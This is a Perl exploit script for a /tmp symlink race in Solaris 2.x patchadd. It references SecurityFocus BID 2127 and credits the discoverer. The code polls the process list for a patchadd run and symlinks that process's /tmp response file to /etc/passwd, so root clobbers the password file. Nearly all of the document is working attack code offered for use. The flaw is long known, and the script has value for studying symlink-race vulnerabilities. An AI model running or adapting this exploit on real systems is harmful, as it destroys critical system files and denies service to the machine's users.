#!/usr/local/bin/perl
#Exploit for patchadd Solaris 2.x. Symlink /tmp file creation
#vulnerability
#patchadd creates files in /tmp with mode 644 that can be used to clobber
#system files when executed by root.
#Larry W. Cashdollar
#http://vapid.dhs.org:8080
#See BID http://www.securityfocus.com/bid/2127
#Discovery credit: Jonathan Fortin jfortin@revelex.com
#Tested on SunOS smackdown 5.8 Generic_108528-10 sun4u sparc SUNW,Ultra-5_10

use strict;

my $NOISY = 1; # Do you want quiet output?
my $clobber = "/etc/passwd";

print "Listening for patchadd process...\n" if ($NOISY);

while(1) {
  open (ps,"ps -ef | grep -v grep |grep -v PID |");

 while(<ps>) {
   my @args = (split " ", $_);

     if (/patch/) {
        print "Targeting PID $args[1] and symlinking response.$args[1] to
$clobber\n" if ($NOISY);
        symlink($clobber,"/tmp/response.$args[1]");
        exit(1);
      }
 }

}
